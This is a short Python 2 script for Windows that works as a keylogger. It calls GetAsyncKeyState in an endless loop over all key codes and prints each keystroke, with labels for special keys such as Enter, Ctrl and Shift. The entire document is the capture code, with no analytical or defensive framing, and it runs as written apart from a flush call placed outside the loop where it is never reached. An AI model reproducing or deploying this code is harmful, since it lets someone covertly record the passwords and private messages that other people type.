import sys
import time
from ctypes import *

GetAsyncKeyState = cdll.user32.GetAsyncKeyState

special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}

# reset key states
for i in xrange(256):
    GetAsyncKeyState(i)

while True:
    for i in xrange(256):
        if GetAsyncKeyState(i) & 1:
            if i in special_keys:
                print "<%s>" % special_keys[i],
            elif 0x30 <= i <= 0x5a:
                print "%c" % i,
            else:
                print "[%02x]" % i,
sys.stdout.flush()
